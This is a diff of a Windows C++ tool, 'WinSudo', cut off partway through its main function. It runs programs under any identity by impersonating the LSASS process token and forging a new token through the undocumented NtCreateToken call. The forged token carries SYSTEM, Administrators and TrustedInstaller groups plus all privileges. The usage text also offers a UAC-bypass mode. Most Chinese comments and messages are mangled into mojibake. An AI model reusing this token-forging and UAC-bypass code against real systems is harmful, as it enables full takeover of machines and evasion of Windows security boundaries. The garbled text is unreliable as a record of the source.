@@ -1,4 +1,7 @@
-// compile command line: -luserenv -lWtsApi32
+/* 
+compile commandline: 
+g++ WinSudo.cpp -lWtsApi32 -lUserenv -lntdll -ladvapi32 -static -o WinSudo.exe
+*/
 
 #include <Windows.h>
 #include <WtsApi32.h>
@@ -8,62 +11,148 @@
 #include <stdarg.h>
 #include <string>
 #include <vector>
+#include <sddl.h>
 
 // ==========================================
-// ÂÖ®Â±ÄÈÖçÁΩÆ‰∏éÊó•ÂøóÁ≥ªÁªü
+// »´æ÷≈‰÷√
+// ==========================================
+
+bool g_bDebug = false;
+
+// ==========================================
+// »’÷æœµÕ≥
 // ==========================================
 
 void WriteToStdOut(const char* str) {
     HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
     if (hOut == INVALID_HANDLE_VALUE || hOut == NULL) return;
-
     DWORD written;
-    // Â∞ùËØï‰Ωú‰∏∫ÊéßÂà∂Âè∞ÂÜôÂÖ• (ÊîØÊåÅÈ¢úËâ≤)
     if (!WriteConsoleA(hOut, str, strlen(str), &written, NULL)) {
-        // Â¶ÇÊûúÈáçÂÆöÂêëÂà∞‰∫ÜÊñá‰ª∂/ÁÆ°ÈÅìÔºåWriteConsole ‰ºöÂ§±Ë¥•ÔºåÂõûÈÄÄÂà∞ WriteFile
         WriteFile(hOut, str, strlen(str), &written, NULL);
     }
 }
 
-bool g_bDebug = false;
-enum LogLevel { LOG_ERROR, LOG_WARN, LOG_INFO, LOG_SUCCESS };
+enum LogLevel { LOG_ERROR, LOG_WARN, LOG_INFO, LOG_SUCCESS, LOG_DEBUG };
+
 void Log(LogLevel level, const char* format, ...) {
-    if (level == LOG_INFO && !g_bDebug) return;
+    // °Ô –ﬁ∏¥£∫∑«µ˜ ‘ƒ£ Ω÷ªœ‘ æ ERROR ∫Õ WARN
+    if (!g_bDebug && level != LOG_ERROR && level != LOG_WARN) return;
+    
     const char* prefix = "";
     HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
     CONSOLE_SCREEN_BUFFER_INFO csbi;
-    GetConsoleScreenBufferInfo(hOut, &csbi);
-    WORD wOldColor = csbi.wAttributes, wColor = wOldColor;
+    WORD wOldColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
+    if (GetConsoleScreenBufferInfo(hOut, &csbi)) {
+        wOldColor = csbi.wAttributes;
+    }
+    WORD wColor = wOldColor;
+    
     switch (level) {
         case LOG_ERROR:   prefix = "[!] "; wColor = FOREGROUND_RED | FOREGROUND_INTENSITY; break;
         case LOG_WARN:    prefix = "[-] "; wColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY; break;
         case LOG_INFO:    prefix = "[*] "; wColor = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY; break;
         case LOG_SUCCESS: prefix = "[+] "; wColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY; break;
+        case LOG_DEBUG:   prefix = "[D] "; wColor = FOREGROUND_INTENSITY; break;
     }
+    
     SetConsoleTextAttribute(hOut, wColor);
     WriteToStdOut(prefix);
-    {
-        char buffer[4096];
-        va_list args;
-        va_start(args, format);
-        vsnprintf(buffer, sizeof(buffer), format, args);
-        va_end(args);
-        WriteToStdOut(buffer);
-    }
-    WriteToStdOut("\r\n");
-    SetConsoleTextAttribute(hOut, wOldColor);
     
-    if(level == LOG_ERROR)__builtin_ia32_pause();
+    char buffer[4096];
+    va_list args;
+    va_start(args, format);
+    vsnprintf(buffer, sizeof(buffer), format, args);
+    va_end(args);
+    WriteToStdOut(buffer);
+    WriteToStdOut("\r\n");
+    
+    SetConsoleTextAttribute(hOut, wOldColor);
 }
 
 // ==========================================
-// Âü∫Á°ÄÂ∑•ÂÖ∑ÂáΩÊï∞
+// NT API ∂®“Â
 // ==========================================
+
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+
+#ifndef SE_GROUP_INTEGRITY
+#define SE_GROUP_INTEGRITY (0x00000020L)
+#endif
+#ifndef SE_GROUP_INTEGRITY_ENABLED
+#define SE_GROUP_INTEGRITY_ENABLED (0x00000040L)
+#endif
+
+typedef struct _MY_OBJECT_ATTRIBUTES {
+    ULONG  Length;
+    HANDLE RootDirectory;
+    PVOID  ObjectName;
+    ULONG  Attributes;
+    PVOID  SecurityDescriptor;
+    PVOID  SecurityQualityOfService;
+} MY_OBJECT_ATTRIBUTES;
+
+typedef struct _TOKEN_SOURCE_CUSTOM {
+    CHAR SourceName[8];
+    LUID SourceIdentifier;
+} TOKEN_SOURCE_CUSTOM;
+
+typedef NTSTATUS(NTAPI* PNtCreateToken)(
+    PHANDLE, ACCESS_MASK, PVOID, TOKEN_TYPE, PLUID, PLARGE_INTEGER,
+    PTOKEN_USER, PTOKEN_GROUPS, PTOKEN_PRIVILEGES, PTOKEN_OWNER,
+    PTOKEN_PRIMARY_GROUP, PTOKEN_DEFAULT_DACL, PVOID);
+
+// ==========================================
+// ∏®÷˙π§æﬂ∫Ø ˝
+// ==========================================
+
+void ShowUsage(const char* prog) {
+    printf("\n");
+    printf("WinSudo v3.3 - “‘»Œ“‚…Ì∑›‘À––≥Ã–Ú\n");
+    printf("================================\n\n");
+    printf("”√∑®: %s [—°œÓ] <√¸¡Ó>\n\n", prog);
+    printf("…Ì∑›—°œÓ:\n");
+    printf("  -U:<√˚≥∆|SID>     ÷∏∂®‘À––…Ì∑› (ƒ¨»œ: System)\n");
+    printf("                    øÏΩ›∑Ω Ω: S/System, A/Admin, TI/TrustedInstaller\n\n");
+    printf("¡Ó≈∆—°œÓ:\n");
+    printf("  -G:<◊È√˚>         œÚ¡Ó≈∆ÃÌº”∂ÓÕ‚µƒ◊È (∫¨ø’∏Ò–Ëº”“˝∫≈)\n");
+    printf("  -P                ∆Ù”√¡Ó≈∆÷–µƒÀ˘”–Ãÿ»®\n\n");
+    printf("‘À––—°œÓ:\n");
+    printf("  -i                ƒ⁄¡™ƒ£ Ω (‘⁄µ±«∞øÿ÷∆Ã®‘À––)\n");
+    printf("  -B                 π”√ UAC Bypass ∑Ω ΩÃ·»®\n");
+    printf("  -D                œ‘ æµ˜ ‘–≈œ¢\n");
+    printf("  -h, --help, /?    œ‘ æ¥À∞Ô÷˙\n\n");
+    printf(" æ¿˝:\n");
+    printf("  %s -U:S cmd.exe                          “‘ SYSTEM …Ì∑›‘À––\n", prog);
+    printf("  %s -U:TI -P -i cmd.exe                   “‘ TI …Ì∑›ƒ⁄¡™‘À––\n", prog);
+    printf("  %s -U:S -G:\"CONSOLE LOGON\" cmd.exe       ÃÌº”øÿ÷∆Ã®µ«¬º◊È\n", prog);
+    printf("  %s -B -U:S cmd.exe                        π”√ bypass ∑Ω Ω\n", prog);
+    printf("  %s -U:S cmd /k echo \"hello world\"        ‘À––¥¯≤Œ ˝µƒ√¸¡Ó\n", prog);
+}
+
+// °Ô ªÒ»°√¸¡Ó––÷–Ã¯π˝≥Ã–Ú√˚∫Ûµƒ≤Œ ˝≤ø∑÷
+const char* SkipProgramName(const char* cmdLine) {
+    if (!cmdLine) return "";
+    
+    // Ã¯π˝≥Ã–Ú√˚
+    if (*cmdLine == '"') {
+        cmdLine++;
+        while (*cmdLine && *cmdLine != '"') cmdLine++;
+        if (*cmdLine == '"') cmdLine++;
+    } else {
+        while (*cmdLine && *cmdLine != ' ' && *cmdLine != '\t') cmdLine++;
+    }
+    
+    // Ã¯π˝ø’∏Ò
+    while (*cmdLine == ' ' || *cmdLine == '\t') cmdLine++;
+    
+    return cmdLine;
+}
 
 BOOL IsUserAnAdmin() {
     SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
     PSID AdministratorsGroup;
-    BOOL b = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
+    BOOL b = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, 
+        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
     if (b) { 
         if (!CheckTokenMembership(NULL, AdministratorsGroup, &b)) b = FALSE; 
         FreeSid(AdministratorsGroup); 
@@ -72,331 +161,570 @@ BOOL IsUserAnAdmin() {
 }
 
 DWORD GetActiveSessionID() {
-    DWORD count = 0; PWTS_SESSION_INFOA pSessionInfo = NULL; DWORD activeSessionId = (DWORD)-1;
+    DWORD count = 0; 
+    PWTS_SESSION_INFOA pSessionInfo = NULL; 
+    DWORD activeSessionId = (DWORD)-1;
     if (WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &count)) {
-        for (DWORD i = 0; i < count; ++i) { if (pSessionInfo[i].State == WTSActive) { activeSessionId = pSessionInfo[i].SessionId; break; } }
+        for (DWORD i = 0; i < count; ++i) { 
+            if (pSessionInfo[i].State == WTSActive) { 
+                activeSessionId = pSessionInfo[i].SessionId; 
+                break; 
+            } 
+        }
         WTSFreeMemory(pSessionInfo);
     }
-    if (activeSessionId == (DWORD)-1) ProcessIdToSessionId(GetCurrentProcessId(), &activeSessionId);
+    if (activeSessionId == (DWORD)-1) 
+        ProcessIdToSessionId(GetCurrentProcessId(), &activeSessionId);
     return activeSessionId;
 }
 
-void EnablePrivileges(HANDLE hToken) {
-    DWORD dwSize = 0; GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
+BOOL EnablePrivilege(HANDLE hToken, LPCSTR privilegeName) {
+    HANDLE hTokenToUse = hToken;
+    BOOL bMyToken = FALSE;
+    if (hTokenToUse == NULL) {
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenToUse)) 
+            return FALSE;
+        bMyToken = TRUE;
+    }
+    LUID luid;
+    if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
+        if (bMyToken) CloseHandle(hTokenToUse);
+        return FALSE;
+    }
+    TOKEN_PRIVILEGES tp = { 1, {{ luid, SE_PRIVILEGE_ENABLED }} };
+    BOOL r = AdjustTokenPrivileges(hTokenToUse, FALSE, &tp, sizeof(tp), NULL, NULL);
+    DWORD err = GetLastError();
+    if (bMyToken) CloseHandle(hTokenToUse);
+    return r && (err == ERROR_SUCCESS);
+}
+
+void EnableAllPrivileges(HANDLE hToken) {
+    DWORD dwSize = 0; 
+    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
     if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return;
-    std::vector<BYTE> buffer(dwSize); PTOKEN_PRIVILEGES pPrivs = (PTOKEN_PRIVILEGES)buffer.data();
+    std::vector<BYTE> buffer(dwSize); 
+    PTOKEN_PRIVILEGES pPrivs = (PTOKEN_PRIVILEGES)buffer.data();
     if (GetTokenInformation(hToken, TokenPrivileges, pPrivs, dwSize, &dwSize)) {
-        for (DWORD i = 0; i < pPrivs->PrivilegeCount; i++) pPrivs->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
+        for (DWORD i = 0; i < pPrivs->PrivilegeCount; i++) 
+            pPrivs->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
         AdjustTokenPrivileges(hToken, FALSE, pPrivs, 0, NULL, NULL);
+        Log(LOG_DEBUG, "“—∆Ù”√ %d ∏ˆÃÿ»®", pPrivs->PrivilegeCount);
     }
 }
 
-BOOL EnableCurrentProcessDebugPrivilege() {
-	HANDLE hToken;
-	TOKEN_PRIVILEGES tkp;
-	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
-		tkp.PrivilegeCount = 1;
-		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-		BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
-		CloseHandle(hToken);
-		return result;
-	}
-	return FALSE;
-}
-
-// Âà§Êñ≠ÂΩìÂâçÊòØÂê¶ÊòØ System ÊùÉÈôê
-BOOL IsUserLocalSystem() {
-    BOOL bIsLocalSystem = FALSE;
-    PSID psidLocalSystem;
-    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
-
-    BOOL fSuccess = AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
-        0, 0, 0, 0, 0, 0, 0, &psidLocalSystem);
-    if (fSuccess) {
-        fSuccess = CheckTokenMembership(0, psidLocalSystem, &bIsLocalSystem);
-        FreeSid(psidLocalSystem);
-    }
-
-    return bIsLocalSystem;
-}
-
-// ==========================================
-// ‰ª§ÁâåËé∑ÂèñÈÄªËæë
-// ==========================================
-
-// Ëé∑Âèñ System ‰ª§Áâå
-HANDLE GetSystemToken(DWORD activeSessionId) {
+DWORD GetPidByNameA(LPCSTR processName) {
+    DWORD pid = 0;
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;
-
-    DWORD targetPid = 0;
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-
-    // Â∞ùËØïÂØªÊâæÂΩìÂâç Session ÁöÑ winlogon
-    if (Process32First(hSnapshot, &pe32)) {
-        do {
-            if (_stricmp(pe32.szExeFile, "winlogon.exe") == 0) {
-                DWORD currentSessionId = 0;
-                if (ProcessIdToSessionId(pe32.th32ProcessID, &currentSessionId)) {
-                    if (currentSessionId == activeSessionId) {
-                        targetPid = pe32.th32ProcessID;
-                        break;
-                    }
-                }
-            }
-        } while (Process32Next(hSnapshot, &pe32));
-    }
-    CloseHandle(hSnapshot);
-    
-    // ÂõûÈÄÄÁ≠ñÁï•
-    if (targetPid == 0) {
-        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (Process32First(hSnapshot, &pe32)) {
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe = { sizeof(pe) };
+        if (Process32First(hSnapshot, &pe)) {
             do {
-                if (_stricmp(pe32.szExeFile, "winlogon.exe") == 0) {
-                    targetPid = pe32.th32ProcessID;
+                if (_stricmp(pe.szExeFile, processName) == 0) {
+                    pid = pe.th32ProcessID;
                     break;
                 }
-            } while (Process32Next(hSnapshot, &pe32));
+            } while (Process32Next(hSnapshot, &pe));
         }
         CloseHandle(hSnapshot);
     }
-
-    if (targetPid == 0) {
-        Log(LOG_ERROR, "Êú™ÊâæÂà∞‰ªª‰Ωï winlogon.exe ËøõÁ®ã");
-        return NULL;
-    }
-
-    Log(LOG_INFO, "ÁõÆÊ†á winlogon PID: %lu", targetPid);
-
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
-    if (!hProcess) return NULL;
-
-    HANDLE hToken = NULL;
-    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken)) {
-        CloseHandle(hProcess);
-        return NULL;
-    }
-
-    HANDLE hDupToken = NULL;
-    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken);
-    
-    CloseHandle(hToken);
-    CloseHandle(hProcess);
-    return hDupToken;
+    return pid;
 }
 
-// Ëé∑Âèñ TrustedInstaller ‰ª§Áâå
-HANDLE GetTrustedInstallerToken(DWORD activeSessionId) {
-    // 2. Êìç‰ΩúÊúçÂä°
-    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
-    if (!hSCManager) {
-        RevertToSelf();
-        return NULL;
+PSID DupSid(PSID src) {
+    if (!src) return NULL;
+    DWORD len = GetLengthSid(src);
+    PSID dst = (PSID)HeapAlloc(GetProcessHeap(), 0, len);
+    if (dst) CopySid(len, dst, src);
+    return dst;
+}
+
+PSID GetSidFromString(LPCSTR str) {
+    PSID sid = NULL;
+    if (ConvertStringSidToSidA(str, &sid)) {
+        PSID dup = DupSid(sid);
+        LocalFree(sid);
+        return dup;
     }
+    return NULL;
+}
 
-    SC_HANDLE hService = OpenServiceA(hSCManager, "TrustedInstaller", SERVICE_START | SERVICE_QUERY_STATUS);
-    if (!hService) {
-        CloseServiceHandle(hSCManager);
-        RevertToSelf();
-        return NULL;
+PSID GetSidForAccountName(LPCSTR accountName) {
+    DWORD sidLen = 0, domainLen = 0;
+    SID_NAME_USE use;
+    LookupAccountNameA(NULL, accountName, NULL, &sidLen, NULL, &domainLen, &use);
+    if (sidLen > 0) {
+        PSID sid = (PSID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sidLen);
+        char* domain = (char*)HeapAlloc(GetProcessHeap(), 0, domainLen);
+        if (sid && domain && LookupAccountNameA(NULL, accountName, sid, &sidLen, domain, &domainLen, &use)) {
+            HeapFree(GetProcessHeap(), 0, domain);
+            return sid;
+        }
+        if (domain) HeapFree(GetProcessHeap(), 0, domain);
+        if (sid) HeapFree(GetProcessHeap(), 0, sid);
     }
+    return NULL;
+}
 
-    SERVICE_STATUS_PROCESS ssp;
-    DWORD bytesNeeded;
-    QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded);
+PSID ResolveIdentity(const char* identityStr) {
+    if (_stricmp(identityStr, "S") == 0 || _stricmp(identityStr, "System") == 0) {
+        Log(LOG_DEBUG, "”≥…‰: %s -> SYSTEM", identityStr);
+        return GetSidFromString("S-1-5-18");
+    }
+    if (_stricmp(identityStr, "A") == 0 || _stricmp(identityStr, "Admin") == 0) {
+        Log(LOG_DEBUG, "”≥…‰: %s -> Administrators", identityStr);
+        return GetSidFromString("S-1-5-32-544");
+    }
+    if (_stricmp(identityStr, "TI") == 0 || _stricmp(identityStr, "TrustedInstaller") == 0) {
+        Log(LOG_DEBUG, "”≥…‰: %s -> TrustedInstaller", identityStr);
+        return GetSidForAccountName("NT SERVICE\\TrustedInstaller");
+    }
+    PSID sid = GetSidFromString(identityStr);
+    if (sid) return sid;
+    return GetSidForAccountName(identityStr);
+}
 
-    if (ssp.dwCurrentState != SERVICE_RUNNING) {
-        Log(LOG_INFO, "ÂêØÂä® TrustedInstaller ÊúçÂä°...");
-        StartServiceA(hService, 0, NULL);
-        for (int i = 0; i < 40; i++) {
-            Sleep(100);
-            QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded);
-            if (ssp.dwCurrentState == SERVICE_RUNNING) break;
+PSID GetLogonSid() {
+    HANDLE h;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h)) return NULL;
+    DWORD l = 0;
+    GetTokenInformation(h, TokenGroups, 0, 0, &l);
+    std::vector<BYTE> b(l);
+    GetTokenInformation(h, TokenGroups, b.data(), l, &l);
+    CloseHandle(h);
+    
+    PTOKEN_GROUPS g = (PTOKEN_GROUPS)b.data();
+    for (DWORD i = 0; i < g->GroupCount; i++) {
+        if ((g->Groups[i].Attributes & SE_GROUP_LOGON_ID) == SE_GROUP_LOGON_ID) {
+            return DupSid(g->Groups[i].Sid);
         }
     }
-    CloseServiceHandle(hService);
-    CloseServiceHandle(hSCManager);
+    return NULL;
+}
 
-    if (ssp.dwCurrentState != SERVICE_RUNNING) {
-        Log(LOG_ERROR, "TrustedInstaller ÊúçÂä°ÂêØÂä®Â§±Ë¥•");
-        return NULL;
+void TerminateParent(int parentPid, DWORD exitCode) {
+    if (parentPid > 0) {
+        HANDLE hParent = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)parentPid);
+        if (hParent) {
+            TerminateProcess(hParent, exitCode);
+            CloseHandle(hParent);
+        }
     }
-
-    // 3. Ëé∑Âèñ‰ª§Áâå
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ssp.dwProcessId);
-    if (!hProcess) {
-        return NULL;
-    }
-
-    HANDLE hToken = NULL;
-    if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken)) {
-        CloseHandle(hProcess);
-        return NULL;
-    }
-
-    HANDLE hDupToken = NULL;
-    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken);
-
-    CloseHandle(hToken);
-    CloseHandle(hProcess);
-
-    return hDupToken;
 }
 
 // ==========================================
-// ‰∏ªÁ®ãÂ∫è
+// ∫À–ƒ£∫◊‘∂®“Â¡Ó≈∆…˙≥…∆˜
 // ==========================================
 
-int main(int argc, char* argv[]) {    
-    if (argc < 2) {
-        printf("Áî®Ê≥ï: WinSudo.exe [ÈÄâÈ°π] <ÂëΩ‰ª§Ë°å>\n\n");
-        printf("ÈÄâÈ°π:\n");
-        printf("  -S,  --System            System ÊùÉÈôê\n");
-        printf("  -TI, --TrustedInstaller  TrustedInstaller ÊùÉÈôê\n");
-        printf("  -P,  --Privileged        ÂêØÁî®ÊâÄÊúâÁâπÊùÉ\n");
-        printf("  -i,  --inline            ÂÜÖËÅîÊ®°Âºè (Âú®ÂΩìÂâçÁ™óÂè£ÊòæÁ§∫ËæìÂá∫)\n");
-        printf("  -D,  --debug             ÊòæÁ§∫Ë∞ÉËØï‰ø°ÊÅØ\n\n");
-        printf("Á§∫‰æã: WinSudo.exe -i -S cmd.exe\n");
+HANDLE CreateCustomToken(DWORD targetSessionId, PSID pUserSid, const std::vector<std::string>& extraGroups) {
+    Log(LOG_DEBUG, "CreateCustomToken: Session=%d", targetSessionId);
+
+    PNtCreateToken NtCreateToken = (PNtCreateToken)GetProcAddress(
+        GetModuleHandleA("ntdll.dll"), "NtCreateToken");
+    if (!NtCreateToken) { 
+        Log(LOG_ERROR, "Œﬁ∑®ªÒ»° NtCreateToken"); 
+        return NULL; 
+    }
+
+    if (!pUserSid || !IsValidSid(pUserSid)) {
+        Log(LOG_ERROR, "Œﬁ–ßµƒ”√ªß SID");
+        return NULL;
+    }
+
+    LPSTR sidStr = NULL;
+    ConvertSidToStringSidA(pUserSid, &sidStr);
+    Log(LOG_INFO, "ƒø±Í…Ì∑›: %s", sidStr ? sidStr : "unknown");
+    if (sidStr) LocalFree(sidStr);
+
+    EnablePrivilege(NULL, "SeDebugPrivilege");
+
+    PSID pSidSystem = GetSidFromString("S-1-5-18");
+    PSID pSidAdmins = GetSidFromString("S-1-5-32-544");
+    PSID pSidAuth = GetSidFromString("S-1-5-11");
+    PSID pSidEveryone = GetSidFromString("S-1-1-0");
+    PSID pSidAllSvcs = GetSidFromString("S-1-5-80-0");
+    PSID pSidTI = GetSidForAccountName("NT SERVICE\\TrustedInstaller");
+    PSID pSidIntegrity = GetSidFromString("S-1-16-16384");
+    PSID pLogonSid = GetLogonSid();
+
+    DWORD lsassPid = GetPidByNameA("lsass.exe");
+    if (lsassPid == 0) { 
+        Log(LOG_ERROR, "Œ¥’“µΩ lsass.exe"); 
+        return NULL; 
+    }
+
+    Log(LOG_DEBUG, "¥Úø™ LSASS (PID: %d)...", lsassPid);
+    HANDLE hLsassProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
+    if (!hLsassProc) {
+        Log(LOG_ERROR, "Œﬁ∑®¥Úø™ LSASS: %d", GetLastError());
+        return NULL;
+    }
+
+    HANDLE hLsassToken = NULL;
+    if (!OpenProcessToken(hLsassProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hLsassToken)) {
+        Log(LOG_ERROR, "Œﬁ∑®ªÒ»° LSASS ¡Ó≈∆: %d", GetLastError());
+        CloseHandle(hLsassProc);
+        return NULL;
+    }
+
+    if (!ImpersonateLoggedOnUser(hLsassToken)) {
+        Log(LOG_ERROR, "ƒ£ƒ‚ LSASS  ß∞‹: %d", GetLastError());
+        CloseHandle(hLsassToken);
+        CloseHandle(hLsassProc);
+        return NULL;
+    }
+    Log(LOG_DEBUG, "≥…π¶ƒ£ƒ‚ LSASS");
+
+    HANDLE hThreadToken = NULL;
+    OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hThreadToken);
+    EnablePrivilege(hThreadToken, "SeCreateTokenPrivilege");
+    EnablePrivilege(hThreadToken, "SeTcbPrivilege");
+    EnablePrivilege(hThreadToken, "SeAssignPrimaryTokenPrivilege");
+    CloseHandle(hThreadToken);
+
+    std::vector<SID_AND_ATTRIBUTES> groups;
+    groups.push_back({ pUserSid, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_OWNER });
+    if (pLogonSid) groups.push_back({ pLogonSid, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_LOGON_ID });
+    if (pSidSystem) groups.push_back({ pSidSystem, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
+    if (pSidAdmins) groups.push_back({ pSidAdmins, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
+    if (pSidAuth) groups.push_back({ pSidAuth, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
+    if (pSidEveryone) groups.push_back({ pSidEveryone, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
+    if (pSidIntegrity) groups.push_back({ pSidIntegrity, SE_GROUP_INTEGRITY | SE_GROUP_INTEGRITY_ENABLED });
+
+    for (const auto& groupName : extraGroups) {
+        PSID sid = GetSidFromString(groupName.c_str());
+        if (!sid) sid = GetSidForAccountName(groupName.c_str());
+        if (sid) {
+            groups.push_back({ sid, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT });
+            Log(LOG_DEBUG, "ÃÌº”◊È: %s", groupName.c_str());
+        } else {
+            Log(LOG_WARN, "Œﬁ∑®Ω‚Œˆ◊È: %s", groupName.c_str());
+        }
+    }
+
+    DWORD groupsSize = sizeof(TOKEN_GROUPS) + groups.size() * sizeof(SID_AND_ATTRIBUTES);
+    PTOKEN_GROUPS pGroups = (PTOKEN_GROUPS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, groupsSize);
+    pGroups->GroupCount = (DWORD)groups.size();
+    for (size_t i = 0; i < groups.size(); i++) pGroups->Groups[i] = groups[i];
+
+    DWORD privCount = 35;
+    DWORD privSize = sizeof(TOKEN_PRIVILEGES) + privCount * sizeof(LUID_AND_ATTRIBUTES);
+    PTOKEN_PRIVILEGES pPrivs = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, privSize);
+    pPrivs->PrivilegeCount = privCount;
+    for (DWORD i = 0; i < privCount; i++) {
+        pPrivs->Privileges[i].Luid.LowPart = i + 2;
+        pPrivs->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;
+    }
+
+    TOKEN_USER tUser = { { pUserSid, 0 } };
+    TOKEN_OWNER tOwner = { pUserSid };
+    TOKEN_PRIMARY_GROUP tPrim = { pUserSid };
+    TOKEN_SOURCE_CUSTOM tSource;
+    memcpy(tSource.SourceName, "WINSUDO\0", 8);
+    AllocateLocallyUniqueId(&tSource.SourceIdentifier);
+    LUID authId = { 0x3e7, 0 };
+    LARGE_INTEGER exp; exp.QuadPart = -1;
+    MY_OBJECT_ATTRIBUTES oa = { sizeof(MY_OBJECT_ATTRIBUTES) };
+
+    Log(LOG_DEBUG, "µ˜”√ NtCreateToken...");
+    HANDLE hNewToken = NULL;
+    NTSTATUS status = NtCreateToken(
+        &hNewToken, TOKEN_ALL_ACCESS, &oa, TokenPrimary, &authId, &exp,
+        &tUser, pGroups, pPrivs, &tOwner, &tPrim, NULL, &tSource);
+
+    if (status != STATUS_SUCCESS) {
+        Log(LOG_ERROR, "NtCreateToken  ß∞‹: 0x%08X", status);
+        RevertToSelf();
+        CloseHandle(hLsassToken);
+        CloseHandle(hLsassProc);
+        HeapFree(GetProcessHeap(), 0, pGroups);
+        HeapFree(GetProcessHeap(), 0, pPrivs);
+        return NULL;
+    }
+
+    Log(LOG_SUCCESS, "¡Ó≈∆¥¥Ω®≥…π¶");
+
+    if (!SetTokenInformation(hNewToken, TokenSessionId, &targetSessionId, sizeof(DWORD))) {
+        Log(LOG_WARN, "…Ë÷√ SessionId  ß∞‹: %d", GetLastError());
+    }
+
+    RevertToSelf();
+    CloseHandle(hLsassToken);
+    CloseHandle(hLsassProc);
+    HeapFree(GetProcessHeap(), 0, pGroups);
+    HeapFree(GetProcessHeap(), 0, pPrivs);
+
+    return hNewToken;
+}
+
+// ==========================================
+// ÷˜≥Ã–Ú
+// ==========================================
+
+int main(int argc, char* argv[]) {
+    // ∞Ô÷˙ºÏ≤‚
+    if (argc < 2 || strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "/?") == 0) {
+        ShowUsage(argv[0]);
         return 0;
     }
 
-    bool bInline = false, bSystem = false, bTI = false, bPriv = false;
-    int argStart = 1;
+    std::string identityStr = "S";
+    bool bInline = false, bPriv = false, bBypass = false;
+    std::vector<std::string> extraGroups;
+    int argStart = argc;
+    int ParentProcessId = 0;  // 0=Œ¥÷∏∂®, >0=”–∏∏Ω¯≥Ã, <0=bypass∑«inline
+    bool bCleanRegistry = false;
 
-    for (int i = (strcmp(argv[1], "-e") ? 1 : 3); i < argc; i++) {
